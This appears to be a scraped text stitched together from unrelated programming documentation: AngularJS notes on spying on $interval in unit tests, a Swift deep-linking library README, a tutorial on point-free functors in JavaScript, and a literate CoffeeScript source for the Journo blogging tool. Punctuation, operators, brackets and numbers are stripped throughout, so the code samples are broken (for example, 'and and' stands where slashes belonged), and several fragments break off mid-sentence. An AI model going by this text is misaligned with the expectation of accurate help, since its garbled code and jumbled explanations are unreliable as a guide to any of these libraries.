looser than httpbackend expect method  into the list of loaded karma files setup spy in the beforeeach function since every

verify that the interval service injected in the module under test was called it is a little verbose to verify from the unit test we must mock the interval with our function and then call the actual interval from the module ng to provide the same functionality source code we are trying to unit test angular module intervalexample  service numbers  function interval rootscope return function

interval was called somewhere you can see the unit test in file test and spying on interval spec js test and spying on interval spec js if we mock an injected service we can still spy on it just like as if we were spying on the regular service for example let us take the same method as above and mock it angular module tweets  service gettweets  function return function gettweets username return

92350976, a simple way to consume custom deep link urls in a swift app it creates a data object from values in a url which can be used to perform an action in your app an intuitive api that helps you easily work with custom deep link urls supports extracting values from a url s path query string and fragment it s all contained in just one small swift file written in swift  this repository includes a demo app and unit tests add the file deeplinking swift and deeplinking and deeplinking swift to your xcode project your app is passed a deep link url inspects the url to determine what it represents and then performs the appropriate action for that deep link not all urls represent a deep link your app knows how to handle but all deep links can be expressed as a url the api presented here figures out which deep link a url matches and extracts data values from the url so that your app can perform the appropriate action suppose that the url my url scheme and and show and photo name cat can be interpreted by your app as a command to show the photo in an image file whose name is cat using the deep linking api in this repository here s how to declare that your app supports this deep link and and and represents presenting an image to the user and and and example my url scheme and and show and photo name cat struct showphotodeeplink deeplink static let template deeplinktemplate term show term photo querystringparameters requiredstring named name  init values deeplinkvalues imagename values query name as string let imagename string this struct adopts the deeplink protocol which requires it to have a static property named template and an initializer whose sole parameter is deeplinkvalues template a typed description of a url from which an instance of the deep link type can be created init values an initializer that receives values extracted from a url already converted to the template specified data types here s another example from the unit tests and deeplinking and deeplinkingtests and deeplinkingtests swift and and examples and and my url scheme and and display and upgrade mustaccept true username josh and and my url scheme and and display and upgrade mustaccept false struct displaymessagedeeplink deeplink static let template deeplinktemplate term display string named messagetype querystringparameters optionalstring named username  requiredbool named mustaccept  init values deeplinkvalues self messagetype values path messagetype as string self mustaccept values query mustaccept as bool self username values query username as string let messagetype string let mustaccept bool let username string notice that the deeplinktemplate includes a term and a string term represents a hard coded string that must appear in the url path at the specified location for a url to match this deep link type string represents a string variable that must appear in the url path at the specified location for a url to match this deep link type the value of the string will be included in the deeplinkvalues object passed to the deep link s initializer aside from terms and strings a url path variable can be of type int  double  or bool similarly a deep link can declare what query string parameters must and can appear in a matching url a query string parameter can be required or optional if a required parameter is not found in a url then that url cannot be used to create the template s associated deep link type a query parameter can be of type int  double  bool  or string the job of detecting which kind of deep link a url matches is handled by deeplinkrecognizer here is how displaymessagedeeplink from the previous section can be detected and created func testdisplaymessagedeeplink and and a deep link recognizer that knows about the custom deep link type let recognizer deeplinkrecognizer deeplinktypes displaymessagedeeplink self and and a url which conforms to the display message deep link schema let url url string test and and display and upgrade mustaccept true username billy bob and and verify that the recognizer creates a properly configured deep link if let deeplink recognizer deeplink matching url as displaymessagedeeplink xctassertequal deeplink messagetype upgrade xctassertequal deeplink mustaccept true xctassertequal deeplink username billy bob else xctfail when your appdelegate receives a deep link url a deeplinkrecognizer can be used to create the appropriate deeplink object if any of your deeplink types can handle that url this code is from the demo app s appdelegate and deeplinking and demoapp and appdelegate swift private func executedeeplink with url url bool and and create a recognizer with this app s custom deep link types let recognizer deeplinkrecognizer deeplinktypes selecttabdeeplink self showphotodeeplink self and and try to create a deep link object based on the url guard let deeplink recognizer deeplink matching url else print unable to match url url absolutestring return false and and navigate to the view or content specified by the deep link switch deeplink case let link as selecttabdeeplink return selecttab with link case let link as showphotodeeplink return showphoto with link default fatalerror unsupported deeplink type of deeplink the implementation details of how an app responds to a particular deep link is arbitrary but here s an example just to help solidify the idea of where this deep linking api fits into an app private func showphoto with deeplink showphotodeeplink bool guard let tabbarcontroller preparetabbarcontroller else return false and and load an image from the bundle with the provided name guard let image uiimage named deeplink imagename else print there is no image named deeplink imagename return false and and navigate to the specified image tabbarcontroller showphoto image image animated false return true there are other deep linking libraries for swift developers some of which have much more functionality and flexibility based on my experience developing ios and tvos apps that need deep linking this suits my needs sometimes less is more

aliased mappend mconcat  a monoidal reduction foldmap  pointfree fantasy implements a point free version of the fantasy land spec in order to promote a less cluttered more haskell like approach to algebraic programming we ll justify this approach using functor as an example haskell class functor f where fmap a b f a f b we can read this as f is a functor if it provides a function fmap that takes a function from type a to type b and returns a function from type f a to type f b and the functor laws are haskell fmap id id fmap p q fmap p fmap q these are the requirements that fmap must satisfy fmap of the identity function returns the identity function and fmap distributes over function composition we re usually going to call it map rather than fmap we can think of a functor as a container that implements a map function so if we had a functor named container we d expect to be able to say container hello map concat world map length and wind up with container  as long as each function works on the content of the container mapping the function over the container will return a container with the transformed content notice that the type of the content will change if the mapped function returns a different type as with length above so a functor has to be able to contain any type or as julian birch says so what the heck is a functor well really it s just something you can map over and it makes sense we haven t mentioned any specific functors yet it s the particular things that each different functor can do that distinguish them from one another usually these particular things have to do with how you access the values in the container the functor laws and the clean ways they help us to manipulate functors are what all functors have in common  our most common functor in javascript is array of course array is normally written as a pair of square brackets around the value s it s operating on but we can imagine it as an explicit function namely the array constructor instead also imagine that the array constructor does not have special case behavior when passed a single argument also note that we re considering arrays whose contents are all of a single type the value of an array is a sequence of values of that underlying type mapping a function f such as the function and  over an array produces a new array whose value is a sequence of underlying values each value equal to f x  or and  of the original in code array  map function n return n and  and and array  the fmap function for array conveniently is the similarly named array prototype map does it satisfy the functor laws u map function a return a and and is equivalent to u identity u map function x return f g x and and is equivalent to u map g map f composition you can verify these pretty easily but notice that the laws have gotten a bit more prolix of course once we define var id function a return a var compose function f g return function x return f g x they become u map id u u map compose f g u map g map f this is neater but we also want to avoid mentioning that u we want to speak of standalone functions not methods and so we provide a map function that s not defined on array prototype here s why if you have a function that works on a single value and you want to transform it to work on some functor say array you can call map on your function like this map f funnyfortune function x return x and in bed var worksonarrayfortune map funnyfortune this saves you from having to type var worksonarrayfortune function xs return xs map funnyfortune in fact you may not need to define worksonarrayfortune at all since you can simply say map funnyfortune inline when you need it and this works for every functor not just array we ll be talking soon enough about other functors you may already be using with this and compose the laws become map id id map compose f g compose map f  map g composing functions without explicitly mentioning their arguments is what we call point free style the points in question are the actual values in topology where the term originated the values are always points  now let s look at a more practical example we re fetching rows from a database formatting what we want from each one and displaying them on the screen say we have three functions getrows which takes an int and returns an array of rows and and and getrows int row getrows function i return db getsomerows i renderrow which takes a row and returns a snippet of html and and and renderrow row html renderrow function row and drawonscreen which takes an array of html snippets and returns a dom tree and and and drawonscreen html dom and and you supply the code from these bite size pieces each responsible for doing its own little job we use compose and map to build up our program and and and prog int dom prog compose drawonscreen map renderrow  getrows notice that when we compose functions the data flows from right to left getrows takes in an int and feeds an array of rows to the left where we use map to convert renderrow into a function that takes in that array of rows and feeds an array of html snippets to the left where drawonscreen is ready to accept it and produce the dom here s how we think about it in terms of the type signatures showing the same data flow from left to right and and and getrows int row and and and map renderrow row html and and and drawonscreen html dom and and and and and prog int dom haskell would be keeping track of the types for us and stopping us if we slip up but in javascript it s up to us to manage them that s why we always try to annotate our functions with these comments  now shit s about to get realer because we need to fetch the rows asynchronously from a remote database for this we re going to use our next functor future the value of a future is the actions that will produce the underlying value that underlying value might be an array of rows or it might be the dom once we have our future it provides a way to actually run those actions and resolve to the underlying value but in the meantime we can compose and map until we re satisfied with how we ve constructed the pure future mapping a function f over a future that will resolve to a value x produces a new future that will resolve to the value f x fantasyland pointfree incorporates functions that work the way we like from several external libraries and future is one we revise getrows to return a future of an array of rows and and and getrows int future row getrows function i return new future function reject resolve resolve i and rows from the database and our program becomes and and and getrows int future row and and and map map renderrow future row future html and and and map drawonscreen future html future dom and and and and and prog int future dom and and and prog int future dom prog compose map drawonscreen  map map renderrow  getrows in a bit we ll cause the future dom to run its actions and resolve to that dom object but first let s unpack this a bit we ve mentioned that map f does the same thing conceptually over any functor transform the functor into the corresponding functor whose underlying value s are f x but when we say map map renderrow  you might ask how hal knows which map is which besides from reading your lips map is polymorphic and if we look at its definition we ll see how that is implemented map  curry function f obj return obj map f map simply delegates to the member function map on whatever object it receives as its second argument this allows us to partially apply it with the first argument f the second argument the one that determines which map implementation will be called is passed in from the right along the chain of composition so the outer map of map map renderrow will receive the future from getrows and the inner map will receive the array of rows inside the future and and and map map renderrow  futureofrows future row future html and and and map renderrow rows row html future has a method fork that runs its actions and resolves to its underlying value so we can invoke our prog like this prog  fork function err  function result and and see folktale and the page displaying two rows will be drawn when the future s underlying value is realized now let s see how the laws help us do a bit of refactoring we remember compose is associative so we can simplify our prog with a helper this comes not from the functor laws but from the fact that functions form a category see below and and and makepage future row future dom makepage compose map drawonscreen  map map renderrow prog compose makepage getrows we remember our law compose map f  map g map compose f g  so we factor out a map just like we do in oh i don t know algebra and and and makepage future row future dom makepage map compose drawonscreen map renderrow prog compose makepage getrows finally we notice we d rather have makepage work on simpler types than futures and and and makepage row dom makepage compose drawonscreen map renderrow prog compose map makepage  getrows you will have noticed that as we manipulate functions with map and compose we are exactly paralleling the way we manipulate variables with addition and multiplication hence the term algebra x and y and z x and y and z add x y z compose compose f g  h compose f compose g h compose f g h add mul    mul  mul add     compose map f  map g map compose f g

8485618, coffeescript journo module exports journo is a blogging program with a few basic goals to wit write in markdown publish to flat files publish via rsync maintain a manifest file what s published and what isn t pub dates retina ready syntax highlight code publish a feed quickly bootstrap a new blog preview via a local server work without javascript but default to a fluid javascript enabled ui you can install and use the journo command via npm sudo npm install g journo now let s go through those features one at a time getting started   create a folder for your blog and cd into it  type journo init to bootstrap a new empty blog  edit the config json  layout html  and posts and index md files to suit  type journo to start the preview server and have at it write in markdown  we ll use the excellent marked module to compile markdown into html and underscore for many of its goodies later on up top create a namespace for shared values needed by more than one function coffeescript marked require marked  require underscore shared to render a post we take its raw source  treat it as both an underscore template for html generation and as markdown for formatting  and insert it into the layout as content coffeescript journo render post source catcherrors do loadlayout source or fs readfilesync postpath post variables rendervariables post markdown  template source

used to wrap every page coffeescript loadlayout force return layout if not force and layout shared layout shared layout  template fs readfilesync layout html tostring publish to flat files  a blog is a folder on your hard drive within the blog you have a posts folder for blog posts a public folder for static content a layout html file for the layout which wraps every page and a journo json file for configuration during a build  a static version of the site is rendered into the site folder by rsync ing over all static files rendering and writing every post and creating an rss feed coffeescript fs require fs path require path spawn exec require childprocess journo build do loadmanifest fs mkdirsync site unless fs existssync site exec rsync vur delete public and site  err stdout

writefilesync site and feed rss  journo feed the config json configuration file is where you keep the configuration details of your blog and how to connect to the server you d like to publish it on the valid settings are title  description  author for rss  url  publish the user host path location to rsync to  and publishport if your server doesn t listen to ssh on the usual one an example config

the site and rsync it up to the server coffeescript journo publish do journo build rsync site and images and  path join shared config publish images and  rsync site and  shared config publish a helper function for rsync ing with logging and the ability to wait for the rsync to continue before proceeding this is useful for ensuring that our any new photos have finished uploading very slowly before

manifestpath journo manifest json loadmanifest do loadconfig shared manifest if fs existssync manifestpath json parse fs readfilesync manifestpath do updatemanifest fs writefilesync manifestpath json stringify shared manifest we update the manifest by looping through every post and every entry in the existing manifest looking for differences in mtime  and recording those along with the title and

automatically downsizing photos from retina to regular sizes but for now this bit is up to you syntax highlight code  we syntax highlight blocks of code with the nifty highlight package that includes heuristics for auto language detection so you don t have to specify what you re coding in coffeescript highlight require highlight marked setoptions highlight code lang highlight code publish a feed  we ll use the rss module to build a simple feed of recent posts start with the basic author  blog title  description and url configured in the config json then each post s title is the first header present in the post the description is the first paragraph and the date is the date you first created the post file coffeescript journo feed rss require rss do loadconfig config shared config feed new

a basic bootstrap folder coffeescript journo init here fs realpathsync if fs existssync posts fatal a blog already exists in here bootstrap path join dirname bootstrap exec rsync vur delete bootstrap  err stdout stderr throw err if err console log initialized new blog in here preview via a local server  instead of constantly rebuilding a purely static version of the site journo provides a preview server which you can start by just typing journo from within your blog coffeescript journo preview http require http mime require mime url require url util require util do loadmanifest server http createserver req res rawpath url parse req url pathname replace and and and and and g or index if the request is for a preview of the rss feed coffeescript if rawpath is feed rss res writehead

anyone know a cross platform equivalent of the osx open command coffeescript else res writehead  res end  not found server listen  work without javascript but default to a fluid javascript enabled ui  the best way to handle this bit seems to be entirely on the client side for example when rendering a javascript slideshow of photographs instead of having the server spit out the slideshow code simply have the blog detect the list of images during page load and move them into a slideshow right then and there using alt attributes for captions for example since the blog is public it s nice if search engines can see all of the pieces as well as readers finally putting it all together run journo from the terminal  we ll do the simplest possible command line interface if a public function exists on the journo object you can run it note that this lets you do silly things like journo tostring but no big deal coffeescript journo run command process argv  or preview return do journo command if journo command console error journo doesn t know how to command let s also provide a help page that lists the available commands coffeescript journo help journo help console log usage journo command if called without a command journo will preview your blog init start a new blog in the current folder build build a static version of the blog into site preview live preview the blog via a local server publish publish the blog to your remote server and we might as well do the version number for completeness sake coffeescript journo version journo version console log journo    miscellaneous bits and utilities  little utility functions that are useful up above the file path to the source of a given post coffeescript postpath post posts and post the server side path to the html for a given
